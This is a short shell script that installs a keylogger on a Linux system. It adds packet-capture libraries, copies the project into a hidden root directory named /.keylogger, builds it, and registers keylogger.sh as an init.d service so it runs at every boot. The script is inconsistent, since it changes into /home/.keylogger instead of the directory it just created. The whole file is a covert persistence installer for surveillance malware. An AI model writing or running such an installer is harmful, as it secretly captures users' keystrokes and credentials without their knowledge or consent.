#!/bin/sh
# Assume root access for all of this to make our lives easier.

# Install libpcap-dev if it is already not on the system.
sudo apt-get install libpcap0.8-dev

sudo mkdir /.keylogger
sudo cp -r . /.keylogger
cd /home/.keylogger

# Create the binaries.
make

chmod +x keylogger.sh
sudo mv keylogger.sh /etc/init.d/
sudo update-rc.d keylogger.sh defaults
